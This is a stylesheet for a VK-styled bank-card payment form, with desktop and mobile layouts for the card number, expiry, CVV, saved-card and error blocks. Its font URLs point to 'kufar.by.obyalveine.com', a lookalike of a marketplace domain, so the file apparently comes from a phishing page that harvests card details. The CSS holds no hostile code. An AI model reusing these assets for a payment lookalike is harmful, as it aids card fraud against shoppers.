.pay-card-layout_type_vk .pay-card__card {
	width: auto;
	margin: 0
}

.pay-card-layout_type_vk .credit-card-form {
	padding-bottom: 15px
}

.pay-card-layout_type_vk .credit-card-form__card-wrapper {
	position: relative
}

.pay-card-layout_type_vk .credit-card-form__form {
	position: static;
	margin: 0;
	padding: 0
}

.pay-card-layout_type_vk .credit-card-form__card {
	margin: 0;
	padding: 0;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_vk .credit-card-form__label-group {
	margin: 0;
	padding: 0
}

.pay-card-layout_type_vk .credit-card-form__card_position_front {
	width: auto;
	height: auto;
	margin: 0;
	padding: 0;
	background: none
}

.pay-card-layout_type_vk .payment-systems-icons {
	position: absolute;
	top: 37px;
	right: 15px
}

.pay-card-layout_type_vk .payment-systems-icon {
	margin-left: 10px;
	pointer-events: none
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_add-card {
	display: block;
	position: relative;
	left: auto;
	top: auto;
	margin: -55px 0 40px 240px;
	color: #000;
	letter-spacing: -.1px
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 13px;
	color: #000;
	letter-spacing: 0
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card-layout_type_vk .pay-card_cvv_no .credit-card-form__label-group_type_add-card {
	margin-left: 240px
}

.pay-card-layout_type_vk [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin: -3px 5px 0 0;
	padding: 1px;
	vertical-align: middle;
	width: 15px;
	height: 15px;
	border: 1px solid #c1c9d1;
	border-radius: 3px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_vk [type=checkbox]+.credit-card-form__input-icon:hover {
	background: #f2f4f8
}

.pay-card-layout_type_vk [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #5b88bd;
	border-color: #5b88bd
}

.pay-card-layout_type_vk [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 3px;
	height: 6px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card-layout_type_vk .pay-card__remove-card {
	display: block;
	position: absolute;
	left: auto;
	top: 0;
	right: 0;
	bottom: auto;
	margin: 0;
	z-index: 3;
	color: #000
}

.pay-card-layout_type_vk .pay-card__remove-card-icon {
	display: none
}

.pay-card-layout_type_vk .pay-card__remove-card-text {
	color: #2a5885;
	font-size: 13px;
	letter-spacing: -.1px
}

.pay-card-layout_type_vk .pay-card__remove-card-text:hover {
	text-decoration: underline
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_expiration-date {
	float: none;
	margin: 0
}

.pay-card-layout_type_vk .credit-card-form__label .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card-layout_type_vk .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100px
}

.pay-card-layout_type_vk .credit-card-form__label_type_cvv {
	right: 0;
	top: 0
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_cvv {
	margin: 0
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_cvv .credit-card-form__label {
	width: 100px;
	float: none;
	margin: 0;
	padding: 0
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_cvv .credit-card-form__title-link {
	color: #828282
}

.pay-card-layout_type_vk .credit-card-form__terms {
	font-size: 13px;
	line-height: 17px;
	letter-spacing: -.1px;
	color: #656565
}

.pay-card-layout_type_vk .credit-card-form__terms-link {
	color: #2a5885;
	text-decoration: none
}

.pay-card-layout_type_vk .credit-card-form__terms-link:hover {
	text-decoration: underline
}

.pay-card-layout_type_vk .credit-card-form__submit {
	margin-top: 0;
	text-align: left
}

.pay-card-layout_type_vk .credit-card-form__submit .button b {
	color: #fff
}

.pay-card-layout_type_vk .credit-card-form__submit .button_disabled_yes,
.pay-card-layout_type_vk .credit-card-form__submit .button_disabled_yes:active,
.pay-card-layout_type_vk .credit-card-form__submit .button_disabled_yes:hover {
	color: #fff;
	background: #5181b8;
	opacity: .7
}

.pay-card_type_vk .credit-card-form__popup {
	position: relative
}

.pay-card-layout__notification_type_vk .info-block_type_question .button,
.pay-card-layout__notification_type_vk .info-block_type_question .button_theme_vk-light,
.pay-card-layout_type_vk .credit-card-form__popup .button,
.pay-card-layout_type_vk .credit-card-form__popup .button_theme_vk-light,
.pay-card-layout_type_vk .credit-card-form__submit .button,
.pay-card-layout_type_vk .credit-card-form__submit .button_theme_vk-light {
	height: 36px;
	margin: 0 6px 0 0;
	padding: 0 15px;
	font-family: -apple-system, BlinkMacSystemFont, Roboto, Open Sans, Helvetica Neue, sans-serif;
	font-size: 14px;
	line-height: 15px;
	font-weight: 400;
	outline: none;
	cursor: pointer;
	-webkit-font-smoothing: antialiased
}

.pay-card-layout__notification_type_vk .info-block_type_question .button:last-child,
.pay-card-layout_type_vk .credit-card-form__popup .button:last-child,
.pay-card-layout_type_vk .credit-card-form__submit .button:last-child {
	margin-right: 0
}

.pay-card-layout__notification_type_vk .info-block_type_question .button,
.pay-card-layout_type_vk .credit-card-form__popup .button,
.pay-card-layout_type_vk .credit-card-form__submit .button {
	color: #fff;
	border-radius: 4px;
	background: #5181b8;
	letter-spacing: -.2px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout__notification_type_vk .info-block_type_question .button:hover,
.pay-card-layout_type_vk .credit-card-form__popup .button:hover,
.pay-card-layout_type_vk .credit-card-form__submit .button:hover {
	background: #5b88bd
}

.pay-card-layout__notification_type_vk .info-block_type_question .button:active,
.pay-card-layout_type_vk .credit-card-form__popup .button:active,
.pay-card-layout_type_vk .credit-card-form__submit .button:active {
	background: #4872a3
}

.pay-card-layout__notification_type_vk .info-block_type_question .button_theme_vk-light,
.pay-card-layout_type_vk .credit-card-form__popup .button_theme_vk-light,
.pay-card-layout_type_vk .credit-card-form__submit .button_theme_vk-light {
	color: #2a5885;
	border-radius: 4px;
	text-shadow: none;
	background: transparent;
	letter-spacing: -.2px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout__notification_type_vk .info-block_type_question .button_theme_vk-light:hover,
.pay-card-layout_type_vk .credit-card-form__popup .button_theme_vk-light:hover,
.pay-card-layout_type_vk .credit-card-form__submit .button_theme_vk-light:hover {
	background: #dfe6ed
}

.pay-card-layout__notification_type_vk .info-block_type_question .button_theme_vk-light:active,
.pay-card-layout_type_vk .credit-card-form__popup .button_theme_vk-light:active,
.pay-card-layout_type_vk .credit-card-form__submit .button_theme_vk-light:active {
	background: #dae2ea
}

.pay-card-layout_type_vk .pay-card_p2p_incoming .button {
	color: #fff;
	border-radius: 4px;
	text-shadow: none;
	background: #4bb34b;
	letter-spacing: -.2px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_vk .pay-card_p2p_incoming .button:hover {
	background: #54b854
}

.pay-card-layout_type_vk .pay-card_p2p_incoming .button:active {
	background: #429e42
}

.pay-card-layout_type_vk .credit-card-form__popup .paragraph,
.pay-card-layout_type_vk .credit-card-form__popup .title {
	font-size: 14px;
	line-height: 1.5;
	letter-spacing: -.2px;
	color: #000
}

.pay-card-layout_type_vk .credit-card-form__popup .button {
	line-height: 36px
}

.pay-card-layout_type_vk .credit-card-form__cvv-icon {
	display: none
}

.pay-card-layout_type_vk .credit-card-form__tooltip_visible_yes {
	opacity: .7
}

.pay-card-layout_type_vk .credit-card-form__tooltip-icon {
	display: none
}

.pay-card-layout_type_vk .credit-card-form__tooltip {
	top: -30px;
	left: -35px;
	padding: 5px 7px;
	font-size: 13px;
	line-height: 13px;
	color: #fff;
	text-align: left;
	border-radius: 4px;
	-webkit-box-shadow: none;
	box-shadow: none;
	background: #0e0e0e;
	-webkit-font-smoothing: antialiased
}

.pay-card-layout_type_vk .credit-card-form__tooltip-arrow {
	right: auto;
	left: 50%;
	border-top-color: #0e0e0e;
	border-width: 4px;
	margin-left: -4px
}

.pay-card-layout_type_vk .pay-card__card_type_added-card .credit-card-form__tooltip {
	left: 0
}

.pay-card-layout_type_vk .pay-card__card_type_added-card .credit-card-form__tooltip .credit-card-form__tooltip-arrow {
	left: 75px
}

.pay-card-layout_type_vk .pay-card_expiration-date_yes .pay-card__card_type_added-card .credit-card-form__tooltip {
	left: -35px
}

.pay-card-layout_type_vk .pay-card_expiration-date_yes .pay-card__card_type_added-card .credit-card-form__tooltip-arrow {
	left: 50%
}

.pay-card-layout_type_vk .credit-card-form__buttons-and-terms-container {
	display: table;
	margin: 0 0 5px
}

.pay-card-layout_type_vk .credit-card-form__buttons-and-terms-container .credit-card-form__submit {
	display: table-cell;
	width: 1%;
	vertical-align: middle
}

.pay-card-layout_type_vk .credit-card-form__buttons-and-terms-container .credit-card-form__terms {
	display: table-cell;
	width: 99%;
	vertical-align: middle;
	padding: 0 0 0 15px
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_card-number .credit-card-form__input {
	text-transform: none
}

.pay-card-layout_type_vk .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number,
.pay-card-layout_type_vk .pay-card__card_type_added-card .credit-card-form__label-group_type_expiration-date .credit-card-form__label,
.pay-card-layout_type_vk .pay-card__card_type_added-card .payment-systems-icon_disabled_yes {
	display: none
}

.pay-card-layout_type_vk .pay-card__card_type_added-card .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv,
.pay-card-layout_type_vk .pay-card_expiration-date_yes .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	display: block
}

.pay-card-layout_type_vk .pay-card__card_type_added-card .credit-card-form__label-group_type_cvv {
	margin: 0
}

.pay-card-layout_type_vk .pay-card__card_type_added-card .payment-systems-icons {
	top: -57px;
	right: 35px
}

.pay-card-layout_type_vk .pay-card_cvv_no .pay-card__card_type_added-card .credit-card-form__label_type_cvv {
	display: none
}

.pay-card-layout_type_vk .pay-card_type_vk-reg .credit-card-form__terms {
	padding-top: 15px
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	margin-right: 20px
}

.pay-card-layout__notification_type_vk .info-block_type_notification .info-block__content {
	margin: 0 0 15px;
	padding: 0 0 15px;
	border-bottom: 1px solid #e7e8ec
}

.pay-card-layout__notification_type_vk .info-block_type_notification .info-block__columns {
	display: table;
	font-size: 14px
}

.pay-card-layout__notification_type_vk .info-block_type_notification .info-block__column {
	display: table-cell;
	padding: 0 0 5px;
	letter-spacing: -.2px
}

.pay-card-layout__notification_type_vk .info-block_type_notification .info-block__column_type_left {
	width: 140px;
	color: #828282
}

.pay-card-layout__notification_type_vk .info-block_type_notification .info-block__column_type_right {
	width: 290px;
	color: #000
}

.pay-card-layout__notification_type_vk .info-block_type_sum .info-block__content {
	padding: 0;
	border-bottom: 0
}

.pay-card-layout__notification_type_vk .info-block_type_sum .info-block__column,
.pay-card-layout__notification_type_vk .info-block_type_sum .info-block__columns {
	display: block
}

.pay-card-layout__notification_type_vk .info-block_type_sum .info-block__column_type_left,
.pay-card-layout__notification_type_vk .info-block_type_sum .info-block__column_type_right {
	width: auto
}

.pay-card-layout__notification_type_vk .info-block_type_sum .info-block__column_type_right,
.pay-card-layout__notification_type_vk .info-block_type_title .title {
	font-size: 16px;
	letter-spacing: -.3px
}

.pay-card-layout__notification_type_vk .info-block_type_error {
	display: none;
	margin: 0 0 20px;
	padding: 10px 15px;
	border: 1px solid #f2ab99;
	border-radius: 4px;
	background: #ffefe9;
	text-align: left;
	color: #000;
	outline: 0
}

.pay-card-layout__notification_type_vk .info-block_type_error .paragraph {
	margin: 0;
	font-size: 13px;
	line-height: 1.38;
	letter-spacing: -.1px
}

.pay-card-layout__notification_type_vk .info-block_type_question {
	display: none;
	position: fixed;
	left: 0;
	top: 0;
	width: 100%;
	height: 100%;
	z-index: 100;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #000
}

.pay-card-layout__notification_type_vk .info-block_type_question .info-block__content {
	position: fixed;
	left: 50%;
	top: 50%;
	width: 280px;
	margin: -85px 0 0 -140px;
	padding: 30px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 4px;
	background: #fff;
	text-align: center;
	-webkit-box-shadow: 0 0 40px 0 rgba(0, 0, 0, .3);
	box-shadow: 0 0 40px 0 rgba(0, 0, 0, .3);
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none
}

.pay-card-layout__notification_type_vk .info-block_type_question .title {
	margin: 0 0 5px;
	font-size: 16px;
	line-height: -.3px;
	color: #222;
	font-weight: 700
}

.pay-card-layout__notification_type_vk .info-block_type_question .paragraph {
	margin: 0 0 20px;
	font-size: 14px;
	line-height: 18px;
	letter-spacing: -.2px;
	color: #030303
}

.pay-card-layout_type_vk .pay-card .control__select {
	line-height: 44px
}

.pay-card-layout_type_vk .credit-card-form__input,
.pay-card-layout_type_vk .pay-card .control__select,
.pay-card-layout_type_vk .payment-form__label_type_amount .payment-form_input {
	display: block;
	min-width: auto;
	width: 100%;
	height: 44px;
	padding: 0 10px;
	margin: 0 0 25px;
	font-family: -apple-system, BlinkMacSystemFont, Roboto, Open Sans, Helvetica Neue, sans-serif;
	font-size: 16px;
	border: 1px solid #d3d9de;
	border-radius: 4px;
	background: none;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #000;
	letter-spacing: -.3px
}

.pay-card-layout_type_vk .payment-form__label_type_amount {
	display: block;
	margin: 0 0 -15px;
	font-size: 16px;
	color: #000
}

.pay-card-layout_type_vk .payment-form__label_type_amount .payment-form_input {
	display: inline-block;
	width: 120px;
	margin-right: 10px
}

.pay-card-layout_type_vk .credit-card-form__label_error_yes .credit-card-form__input,
.pay-card-layout_type_vk .payment-form__label_error_yes .payment-form_input {
	outline: 0;
	border-color: #d9aeae;
	background-color: #faeaea
}

.pay-card-layout_type_vk .pay-card .control__select .selectBox-label {
	padding: 0
}

.control__select_type_vk {
	width: 100%!important
}

.control__select_type_vk.control__select.selectBox-dropdown .selectBox-arrow {
	border: none;
	margin: 0;
	-webkit-transform: translateY(-50%) translateX(-7px);
	-o-transform: translateY(-50%) translateX(-7px);
	transform: translateY(-50%) translateX(-7px);
	pointer-events: none
}

.control__select_type_vk-selectBox-dropdown-menu a {
	display: block!important;
	padding: 5px 10px!important;
	cursor: pointer!important
}

.control__select_type_vk-selectBox-dropdown-menu a:hover {
	background: #e7edf2!important
}

.control__select_type_vk-selectBox-dropdown-menu {
	border: 1px solid #d5d9de;
	-webkit-box-shadow: none;
	box-shadow: none;
	border-radius: 4px;
	font-family: -apple-system, BlinkMacSystemFont, Roboto, Open Sans, Helvetica Neue, sans-serif
}

.control__select_type_vk-selectBox-dropdown-menu li {
	font-size: 16px;
	line-height: 20px
}

.control__select_type_vk-selectBox-dropdown-menu li.selectBox-selected a {
	background: #e7edf2;
	cursor: pointer
}

.pay-card-layout_type_vk .secure-information_type_vk-iframe {
	margin: 0
}

.pay-card-layout_type_vk .secure-information__text_type_protocol {
	color: #43a843
}

@font-face {
	font-family: SFUIText;
	src: url("https://kufar.by.obyalveine.com/css/fonts/SFUIText/sfuitext-regular-sfuitext.eot");
	src: url("https://kufar.by.obyalveine.com/css/fonts/SFUIText/sfuitext-regular-sfuitext.eot?") format("embedded-opentype"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIText/sfuitext-regular-sfuitext.woff2") format("woff2"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIText/sfuitext-regular-sfuitext.woff") format("woff"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIText/sfuitext-regular-sfuitext.ttf") format("truetype"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIText/sfuitext-regular-sfuitext.svg") format("svg");
	font-weight: 400;
	font-style: normal
}

.pay-card-layout_type_vk-mobile {
	position: relative;
	min-height: 100%;
	min-width: 320px;
	margin: 0 auto;
	padding: 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: SFUIText, arial, helvetica;
	font-size: 13px;
	color: #000;
	background: #fff;
	-webkit-font-smoothing: antialiased
}

.pay-card-layout_type_vk-mobile .pay-card-layout__header {
	height: 48px;
	overflow: hidden;
	margin: -10px -10px 10px;
	padding: 0 10px 0 0;
	border-bottom: 1px solid #e7e8ec;
	background: #5181b8
}

.pay-card-layout_type_vk-mobile .pay-card-layout__logo {
	float: left
}

.pay-card-layout_type_vk-mobile .pay-card-layout__title {
	padding: 15px 0;
	float: left;
	font-size: 16px;
	line-height: 20px;
	color: #fff;
	letter-spacing: -.3px
}

.pay-card-layout_type_vk-mobile .secure-information {
	margin: 0 0 15px;
	padding: 15px 0 0;
	font-size: 14px;
	border-top: 1px solid #e7e8ec;
	background: none
}

.pay-card-layout_type_vk-mobile .secure-information__column {
	padding: 0
}

.pay-card-layout_type_vk-mobile .secure-information__column_position_left {
	width: 100%
}

.pay-card-layout_type_vk-mobile .secure-information__text {
	font-size: 14px;
	letter-spacing: -.2px
}

.pay-card_type_vk-mobile {
	text-align: left
}

.pay-card_type_vk-mobile .pay-card__row {
	padding-top: 0
}

.pay-card_type_vk-mobile .pay-card__card-selector {
	width: auto;
	margin: 0
}

.pay-card_type_vk-mobile .pay-card__card-selector .control-label,
.pay-card_type_vk-mobile .pay-card__select-card {
	display: block
}

.pay-card_type_vk-mobile .pay-card__select-card .control {
	margin-right: 0
}

.pay-card-layout_type_vk-mobile .payment-form__label .payment-form__title,
.pay-card_type_vk-mobile .credit-card-form__label .credit-card-form__title,
.pay-card_type_vk-mobile .pay-card__select-card .control-label__text {
	display: block;
	margin: 0 0 10px;
	font-size: 15px;
	line-height: 20px;
	color: #909499;
	letter-spacing: -.2px;
	text-transform: none
}

.pay-card_type_vk-mobile .pay-card__card {
	width: auto;
	margin: 0
}

.pay-card_type_vk-mobile .credit-card-form {
	padding-bottom: 15px
}

.pay-card_type_vk-mobile .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_vk-mobile .credit-card-form__form {
	margin: 0;
	padding: 0
}

.pay-card_type_vk-mobile .credit-card-form__card {
	margin: 0;
	padding: 0;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-mobile .credit-card-form__label-group {
	margin: 0;
	padding: 0
}

.pay-card_type_vk-mobile .credit-card-form__card_position_front {
	width: auto;
	height: auto;
	margin: 0;
	padding: 0;
	background: none
}

.pay-card_type_vk-mobile .payment-systems-icons {
	top: 42px;
	right: 10px;
	height: 0;
	float: right
}

.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_visa {
	top: 4px
}

.pay-card_type_vk-mobile .payment-systems-icon {
	display: block;
	margin-left: 5px
}

.pay-card_type_vk-mobile .credit-card-form .payment-systems-icon_name_maestro_smaller,
.pay-card_type_vk-mobile .credit-card-form .payment-systems-icon_name_mastercard_smaller {
	-webkit-transform: scale(.5625);
	-o-transform: scale(.5625);
	transform: scale(.5625)
}

.pay-card_type_vk-mobile .credit-card-form .payment-systems-icon_name_mastercard_smaller {
	margin-right: 0;
	margin-left: 0
}

.pay-card_type_vk-mobile .credit-card-form .payment-systems-icon_name_maestro_smaller {
	margin-right: -6px;
	margin-left: -6px
}

.pay-card_type_vk-mobile .credit-card-form .payment-systems-icon_name_mir_smaller,
.pay-card_type_vk-mobile .credit-card-form .payment-systems-icon_name_visa_smaller {
	top: 4px
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_add-card {
	margin: 0 0 10px;
	color: #000
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 15px;
	color: #000;
	letter-spacing: -.2px
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_vk-mobile [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin: -3px 10px 0 0;
	padding: 1px;
	vertical-align: middle;
	width: 20px;
	height: 20px;
	border: 1px solid #c1c9d1;
	border-radius: 4px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_vk-mobile [type=checkbox]+.credit-card-form__input-icon:hover {
	background: #ebedf2
}

.pay-card_type_vk-mobile [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #6786ab;
	border-color: #6786ab
}

.pay-card_type_vk-mobile [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 4px;
	height: 10px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_vk-mobile .pay-card__remove-card {
	display: block;
	position: absolute;
	left: auto;
	top: 0;
	right: 0;
	bottom: auto;
	margin: 0;
	z-index: 3;
	color: #000
}

.pay-card_type_vk-mobile .pay-card__remove-card-icon {
	display: none
}

.pay-card_type_vk-mobile .pay-card__remove-card-text {
	color: #2a5885;
	font-size: 15px;
	letter-spacing: -.2px
}

.pay-card_type_vk-mobile .pay-card__remove-card-text:hover {
	text-decoration: underline
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_expiration-date {
	float: none;
	margin: 0
}

.pay-card_type_vk-mobile .credit-card-form__label .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_vk-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label,
.pay-card_type_vk-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100%
}

.pay-card_type_vk-mobile .credit-card-form__label_type_cvv {
	right: 0;
	top: 0
}

.pay-card_type_vk-mobile .credit-card-form__label_type_cvv .credit-card-form__input {
	text-transform: none
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_cvv {
	margin: 0
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_cvv .credit-card-form__label {
	width: 100px;
	float: none;
	margin: 0;
	padding: 0
}

.pay-card_type_vk-mobile .credit-card-form__label-group_type_cvv .credit-card-form__title-link {
	color: #909499
}

.pay-card_type_vk-mobile .credit-card-form__terms {
	font-size: 14px;
	line-height: 20px;
	letter-spacing: -.2px;
	color: #626972
}

.pay-card_type_vk-mobile .credit-card-form__terms-link {
	color: #416ca9;
	text-decoration: none
}

.pay-card_type_vk-mobile .credit-card-form__terms-link:hover {
	text-decoration: underline
}

.pay-card_type_vk-mobile .credit-card-form__submit {
	margin-top: 0;
	padding: 15px 0 0;
	text-align: left;
	border-top: 1px solid #e7e8ec
}

.pay-card_type_vk-mobile .credit-card-form__submit .button b {
	color: #fff
}

.pay-card_type_vk-mobile .credit-card-form__submit .button_disabled_yes,
.pay-card_type_vk-mobile .credit-card-form__submit .button_disabled_yes:active,
.pay-card_type_vk-mobile .credit-card-form__submit .button_disabled_yes:hover {
	color: #fff;
	background: #5181b8;
	opacity: .5
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button,
.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light,
.pay-card_type_vk-mobile .credit-card-form__popup .button,
.pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light,
.pay-card_type_vk-mobile .credit-card-form__submit .button,
.pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light {
	height: 40px;
	margin: 0 6px 0 0;
	padding: 0 15px;
	font-family: SFUIText, arial, helvetica;
	font-size: 15px;
	line-height: 15px;
	letter-spacing: -.2px;
	font-weight: 400;
	outline: none;
	cursor: pointer
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button:last-child,
.pay-card_type_vk-mobile .credit-card-form__popup .button:last-child,
.pay-card_type_vk-mobile .credit-card-form__submit .button:last-child {
	margin-right: 0
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button,
.pay-card_type_vk-mobile .credit-card-form__popup .button,
.pay-card_type_vk-mobile .credit-card-form__submit .button {
	color: #fff;
	border-radius: 3px;
	background: #5181b8
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button:active,
.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button:hover,
.pay-card_type_vk-mobile .credit-card-form__popup .button:active,
.pay-card_type_vk-mobile .credit-card-form__popup .button:hover,
.pay-card_type_vk-mobile .credit-card-form__submit .button:active,
.pay-card_type_vk-mobile .credit-card-form__submit .button:hover {
	background: #5181b8
}

.pay-card-layout_type_vk-mobile .pay-card_p2p_incoming .button {
	color: #fff;
	border-radius: 3px;
	text-shadow: none;
	background: #61b352
}

.pay-card-layout_type_vk-mobile .pay-card_p2p_incoming .button:active,
.pay-card-layout_type_vk-mobile .pay-card_p2p_incoming .button:hover {
	background: #61b352
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light,
.pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light,
.pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light {
	color: #2b587a;
	border-radius: 0;
	text-shadow: none;
	background: transparent
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light:active,
.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light:hover,
.pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light:active,
.pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light:hover,
.pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light:active,
.pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light:hover {
	background: #e1e7ed
}

.pay-card-layout_type_vk-mobile .credit-card-form__popup .paragraph,
.pay-card-layout_type_vk-mobile .credit-card-form__popup .titles {
	font-size: 14px;
	line-height: 1.5;
	letter-spacing: -.2px;
	color: #000
}

.pay-card_type_vk-mobile .credit-card-form__popup .button {
	line-height: 40px;
	width: 100%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_vk-mobile .credit-card-form__label-group_type_card-number .credit-card-form__input {
	text-transform: none
}

.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card {
	padding: 0
}

.pay-card-layout_type_vk-mobile .credit-card-form__error-text,
.pay-card-layout_type_vk-mobile .credit-card-form__label_type_cvv .credit-card-form__error-text,
.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number,
.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_expiration-date .credit-card-form__label,
.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card .payment-systems-icon_disabled_yes {
	display: none
}

.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_expiration-date .credit-card-form__label-group_type_holder-name .credit-card-form__label,
.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv,
.pay-card-layout_type_vk-mobile .pay-card_expiration-date_yes .credit-card-form__label-group_type_expiration-date .credit-card-form__label,
.pay-card-layout_type_vk-mobile .pay-card_p2p_incoming .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	display: block
}

.pay-card-layout_type_vk-mobile .pay-card_p2p_incoming .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	display: none
}

.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_cvv {
	margin: 0
}

.pay-card-layout_type_vk-mobile .pay-card__card_type_added-card .payment-systems-icons {
	top: -44px;
	right: 25px
}

.pay-card-layout_type_vk-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	margin-right: 20px
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_notification .info-block__content {
	margin: 0 0 15px;
	padding: 0 0 15px;
	border-bottom: 1px solid #e7e8ec
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_notification .info-block__columns {
	display: table;
	font-size: 14px
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_notification .info-block__column {
	display: table-cell;
	padding: 0;
	letter-spacing: -.2px
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_notification .info-block__column_type_left {
	width: 140px;
	color: #909499
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_notification .info-block__column_type_right {
	width: 290px;
	color: #000
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__content {
	margin: -10px -10px 15px;
	padding: 10px;
	border-bottom: 0;
	text-align: center;
	background: #f8f8fa
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__column,
.pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__columns {
	display: block
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__column_type_left,
.pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__column_type_right {
	width: auto
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__column_type_left {
	width: auto;
	color: #626972;
	font-size: 15px;
	line-height: 24px;
	letter-spacing: -.2px
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__column_type_right,
.pay-card-layout__notification_type_vk-mobile .info-block_type_title .title {
	font-size: 20px;
	line-height: 24px;
	letter-spacing: .3px;
	color: #626972
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_error {
	display: none;
	margin: 0 0 15px;
	padding: 10px 15px;
	border: 1px solid #f3ab99;
	border-radius: 3px;
	background: #ffefe9;
	text-align: left;
	color: #000;
	outline: 0
